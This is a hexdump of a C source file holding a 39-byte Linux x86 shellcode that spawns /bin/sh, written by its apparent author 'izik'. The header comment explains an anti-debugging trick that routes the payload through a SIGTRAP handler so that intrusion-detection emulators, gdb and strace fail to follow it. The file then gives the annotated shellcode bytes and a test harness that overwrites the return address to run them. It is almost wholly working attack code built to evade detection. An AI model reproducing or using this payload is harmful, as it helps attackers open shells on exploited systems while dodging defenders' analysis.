00000000  2f 2a 0d 0a 20 2a 20 28  6c 69 6e 75 78 2f 78 38  |/*.. * (linux/x8|
00000010  36 29 20 61 6e 74 69 2d  64 65 62 75 67 20 74 72  |6) anti-debug tr|
00000020  69 63 6b 20 28 49 4e 54  20 33 68 20 74 72 61 70  |ick (INT 3h trap|
00000030  29 20 2b 20 65 78 65 63  76 65 28 22 2f 62 69 6e  |) + execve("/bin|
00000040  2f 73 68 22 2c 20 5b 22  2f 62 69 6e 2f 73 68 22  |/sh", ["/bin/sh"|
00000050  2c 20 4e 55 4c 4c 5d 2c  20 4e 55 4c 4c 29 20 2d  |, NULL], NULL) -|
00000060  20 33 39 20 62 79 74 65  73 20 0d 0a 20 2a 20 0d  | 39 bytes .. * .|
00000070  0a 20 2a 20 54 68 65 20  69 64 65 61 20 62 65 68  |. * The idea beh|
00000080  69 6e 64 20 61 20 73 68  65 6c 6c 63 6f 64 65 20  |ind a shellcode |
00000090  77 2f 20 61 6e 20 61 6e  74 69 2d 64 65 62 75 67  |w/ an anti-debug|
000000a0  67 69 6e 67 20 74 72 69  63 6b 20 65 6d 62 65 64  |ging trick embed|
000000b0  64 65 64 20 69 6e 20 69  74 2c 20 69 73 20 69 66  |ded in it, is if|
000000c0  20 66 6f 72 20 61 6e 79  20 72 65 61 73 6f 6e 20  | for any reason |
000000d0  74 68 65 20 49 44 53 20  0d 0a 20 2a 20 77 6f 75  |the IDS .. * wou|
000000e0  6c 64 20 74 72 79 20 74  6f 20 78 38 36 2d 65 6d  |ld try to x86-em|
000000f0  75 6c 61 74 65 20 74 68  65 20 73 68 65 6c 6c 63  |ulate the shellc|
00000100  6f 64 65 20 69 74 20 77  6f 75 6c 64 20 2a 67 6c  |ode it would *gl|
00000110  69 74 63 68 2a 20 61 6e  64 20 66 61 69 6c 2e 20  |itch* and fail. |
00000120  54 68 69 73 20 61 6c 73  6f 20 70 72 6f 74 65 63  |This also protec|
00000130  74 65 73 20 74 68 65 20  73 68 65 6c 6c 63 6f 64  |tes the shellcod|
00000140  65 20 0d 0a 20 2a 20 66  72 6f 6d 20 72 75 6e 6e  |e .. * from runn|
00000150  69 6e 67 20 77 69 74 68  69 6e 20 61 20 64 65 62  |ing within a deb|
00000160  75 67 67 65 72 20 65 6e  76 69 72 6f 6e 6d 65 6e  |ugger environmen|
00000170  74 20 73 75 63 68 20 61  73 20 67 64 62 20 61 6e  |t such as gdb an|
00000180  64 20 73 74 72 61 63 65  2e 20 0d 0a 20 2a 0d 0a  |d strace. .. *..|
00000190  20 2a 20 48 6f 77 20 74  68 69 73 20 77 6f 72 6b  | * How this work|
000001a0  73 3f 20 74 68 65 20 73  68 65 6c 6c 63 6f 64 65  |s? the shellcode|
000001b0  20 72 65 67 69 73 74 65  72 73 20 66 6f 72 20 74  | registers for t|
000001c0  68 65 20 53 49 47 54 52  41 50 20 73 69 67 6e 61  |he SIGTRAP signa|
000001d0  6c 20 28 61 6b 61 2e 20  42 72 65 61 6b 70 6f 69  |l (aka. Breakpoi|
000001e0  6e 74 20 49 6e 74 65 72  72 75 70 74 29 20 61 6e  |nt Interrupt) an|
000001f0  64 20 75 73 65 20 69 74  20 0d 0a 20 2a 20 74 6f  |d use it .. * to|
00000200  20 63 61 6c 6c 20 74 68  65 20 61 63 75 74 61 6c  | call the acutal|
00000210  20 70 61 79 6c 6f 61 64  20 28 65 2e 67 2e 20 5f  | payload (e.g. _|
00000220  65 76 69 6c 5f 63 6f 64  65 29 20 77 68 69 6c 65  |evil_code) while|
00000230  20 61 20 67 72 65 65 64  79 20 64 65 62 75 67 67  | a greedy debugg|
00000240  65 72 20 6f 72 20 61 20  63 6f 6e 66 75 73 65 64  |er or a confused|
00000250  20 78 38 36 2d 65 6d 75  20 77 6f 6e 27 74 20 70  | x86-emu won't p|
00000260  61 73 73 20 0d 0a 20 2a  20 74 68 65 20 73 69 67  |ass .. * the sig|
00000270  6e 61 6c 20 68 61 6e 64  6c 65 72 20 74 6f 20 74  |nal handler to t|
00000280  68 65 20 73 68 65 6c 6c  63 6f 64 65 2c 20 69 74  |he shellcode, it|
00000290  20 77 6f 75 6c 64 20 65  6e 64 20 75 70 20 64 6f  | would end up do|
000002a0  69 6e 67 20 5f 65 78 69  74 28 29 20 69 6e 73 74  |ing _exit() inst|
000002b0  65 61 64 20 65 78 65 63  75 76 65 28 29 20 0d 0a  |ead execuve() ..|
000002c0  20 2a 0d 0a 20 2a 20 2d  20 69 7a 69 6b 20 3c 69  | *.. * - izik <i|
000002d0  7a 69 6b 40 74 74 79 36  34 2e 6f 72 67 3e 0d 0a  |zik@tty64.org>..|
000002e0  20 2a 2f 0d 0a 0d 0a 63  68 61 72 20 73 68 65 6c  | */....char shel|
000002f0  6c 63 6f 64 65 5b 5d 20  3d 20 0d 0a 0d 0a 09 22  |lcode[] = ....."|
00000300  5c 78 36 61 5c 78 33 30  22 20 20 20 20 20 20 20  |\x6a\x30"       |
00000310  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 24  |       // push $|
00000320  30 78 33 30 20 0d 0a 09  22 5c 78 35 38 22 20 20  |0x30 ..."\x58"  |
00000330  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000340  2f 2f 20 70 6f 70 20 25  65 61 78 20 0d 0a 09 22  |// pop %eax ..."|
00000350  5c 78 36 61 5c 78 30 35  22 20 20 20 20 20 20 20  |\x6a\x05"       |
00000360  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 24  |       // push $|
00000370  30 78 35 20 0d 0a 09 22  5c 78 35 62 22 20 20 20  |0x5 ..."\x5b"   |
00000380  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000390  2f 20 70 6f 70 20 25 65  62 78 20 0d 0a 09 22 5c  |/ pop %ebx ..."\|
000003a0  78 65 62 5c 78 30 35 22  20 20 20 20 20 20 20 20  |xeb\x05"        |
000003b0  20 20 20 20 20 20 2f 2f  20 6a 6d 70 20 3c 5f 65  |      // jmp <_e|
000003c0  76 69 6c 5f 63 6f 64 65  3e 20 0d 0a 0d 0a 09 2f  |vil_code> ...../|
000003d0  2f 0d 0a 20 09 2f 2f 20  3c 5f 65 76 69 6c 63 6f  |/.. .// <_evilco|
000003e0  64 65 5f 6c 6f 63 3e 3a  0d 0a 09 2f 2f 0d 0a 0d  |de_loc>:...//...|
000003f0  0a 09 22 5c 78 35 39 22  20 20 20 20 20 20 20 20  |.."\x59"        |
00000400  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 6f 70  |          // pop|
00000410  20 25 65 63 78 20 0d 0a  09 22 5c 78 63 64 5c 78  | %ecx ..."\xcd\x|
00000420  38 30 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |80"             |
00000430  20 2f 2f 20 69 6e 74 20  24 30 78 38 30 20 0d 0a  | // int $0x80 ..|
00000440  09 22 5c 78 63 63 22 20  20 20 20 20 20 20 20 20  |."\xcc"         |
00000450  20 20 20 20 20 20 20 20  20 2f 2f 20 69 6e 74 33  |         // int3|
00000460  20 0d 0a 09 22 5c 78 34  30 22 20 20 20 20 20 20  | ..."\x40"      |
00000470  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 69  |            // i|
00000480  6e 63 20 25 65 61 78 20  0d 0a 09 22 5c 78 65 38  |nc %eax ..."\xe8|
00000490  5c 78 66 36 5c 78 66 66  5c 78 66 66 5c 78 66 66  |\xf6\xff\xff\xff|
000004a0  22 20 20 2f 2f 20 63 61  6c 6c 20 3c 5f 65 76 69  |"  // call <_evi|
000004b0  6c 63 6f 64 65 5f 6c 6f  63 3e 20 0d 0a 09 22 5c  |lcode_loc> ..."\|
000004c0  78 39 39 22 20 20 20 20  20 20 20 20 20 20 20 20  |x99"            |
000004d0  20 20 20 20 20 20 2f 2f  20 63 6c 74 64 20 0d 0a  |      // cltd ..|
000004e0  0d 0a 09 2f 2f 20 0d 0a  20 20 20 20 20 20 20 20  |...// ..        |
000004f0  2f 2f 20 3c 5f 65 76 69  6c 5f 63 6f 64 65 3e 3a  |// <_evil_code>:|
00000500  20 0d 0a 20 20 20 20 20  20 20 20 2f 2f 0d 0a 0d  | ..        //...|
00000510  0a 09 22 5c 78 62 30 5c  78 30 62 22 20 20 20 20  |.."\xb0\x0b"    |
00000520  20 20 20 20 20 20 20 20  20 20 2f 2f 20 6d 6f 76  |          // mov|
00000530  20 24 30 78 62 2c 25 61  6c 20 0d 0a 09 22 5c 78  | $0xb,%al ..."\x|
00000540  35 32 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |52"             |
00000550  20 20 20 20 20 2f 2f 20  70 75 73 68 20 25 65 64  |     // push %ed|
00000560  78 20 0d 0a 09 22 5c 78  36 38 5c 78 32 66 5c 78  |x ..."\x68\x2f\x|
00000570  32 66 5c 78 37 33 5c 78  36 38 22 20 20 2f 2f 20  |2f\x73\x68"  // |
00000580  70 75 73 68 20 24 30 78  36 38 37 33 32 66 32 66  |push $0x68732f2f|
00000590  20 0d 0a 09 22 5c 78 36  38 5c 78 32 66 5c 78 36  | ..."\x68\x2f\x6|
000005a0  32 5c 78 36 39 5c 78 36  65 22 20 20 2f 2f 20 70  |2\x69\x6e"  // p|
000005b0  75 73 68 20 24 30 78 36  65 36 39 36 32 32 66 20  |ush $0x6e69622f |
000005c0  0d 0a 09 22 5c 78 38 39  5c 78 65 33 22 20 20 20  |..."\x89\xe3"   |
000005d0  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 6d 6f  |           // mo|
000005e0  76 20 25 65 73 70 2c 25  65 62 78 20 0d 0a 09 22  |v %esp,%ebx ..."|
000005f0  5c 78 35 32 22 20 20 20  20 20 20 20 20 20 20 20  |\x52"           |
00000600  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 25  |       // push %|
00000610  65 64 78 20 0d 0a 09 22  5c 78 35 33 22 20 20 20  |edx ..."\x53"   |
00000620  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000630  2f 20 70 75 73 68 20 25  65 62 78 20 0d 0a 09 22  |/ push %ebx ..."|
00000640  5c 78 35 34 22 20 20 20  20 20 20 20 20 20 20 20  |\x54"           |
00000650  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 25  |       // push %|
00000660  65 73 70 20 0d 0a 09 22  5c 78 65 62 5c 78 65 31  |esp ..."\xeb\xe1|
00000670  22 3b 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |";             /|
00000680  2f 20 6a 6d 70 20 3c 5f  65 76 69 6c 63 6f 64 65  |/ jmp <_evilcode|
00000690  5f 6c 6f 63 3e 20 0d 0a  0d 0a 69 6e 74 20 6d 61  |_loc> ....int ma|
000006a0  69 6e 28 69 6e 74 20 61  72 67 63 2c 20 63 68 61  |in(int argc, cha|
000006b0  72 20 2a 2a 61 72 67 76  29 20 7b 0d 0a 09 69 6e  |r **argv) {...in|
000006c0  74 20 2a 72 65 74 3b 0d  0a 09 72 65 74 20 3d 20  |t *ret;...ret = |
000006d0  28 69 6e 74 20 2a 29 26  72 65 74 20 2b 20 32 3b  |(int *)&ret + 2;|
000006e0  0d 0a 09 28 2a 72 65 74  29 20 3d 20 28 69 6e 74  |...(*ret) = (int|
000006f0  29 20 73 68 65 6c 6c 63  6f 64 65 3b 0d 0a 7d     |) shellcode;..}|
000006ff
